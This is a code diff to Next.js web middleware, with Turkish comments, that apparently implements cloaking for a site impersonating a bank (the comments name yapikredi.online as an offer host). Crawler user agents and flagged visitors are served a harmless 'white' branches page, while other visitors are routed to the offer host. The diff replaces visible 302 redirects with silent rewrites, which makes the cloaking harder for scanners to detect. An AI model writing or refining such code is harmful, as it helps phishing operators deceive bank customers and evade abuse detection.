@@ -145,10 +145,7 @@ export async function middleware(request: NextRequest) {
   // sadece CRM'de ayarlı form/offer hostuna (örn. yapikredi.online) yönlenir.
 
   if (CRAWLER_UA.test(ua)) {
-    return NextResponse.redirect(
-      new URL("/subeler.html", request.url),
-      302
-    );
+    return NextResponse.rewrite(new URL("/subeler.html", request.url));
   }
 
   if (request.cookies.get(OFFER_COOKIE)?.value === "1") {
@@ -178,18 +175,12 @@ export async function middleware(request: NextRequest) {
   }
 
   if (onOfferHost) {
-    return NextResponse.redirect(
-      new URL("/subeler.html", request.url),
-      302
-    );
+    return NextResponse.rewrite(new URL("/subeler.html", request.url));
   }
 
   const cloak = await checkCloak(request);
   if (cloak?.page === "white") {
-    return NextResponse.redirect(
-      whiteRedirectTarget(request, cloak.redirectUrl),
-      302
-    );
+    return NextResponse.rewrite(new URL(whiteRedirectTarget(request, cloak.redirectUrl)));
   }
 
   const offerUrl = await buildOfferHostUrl(request);
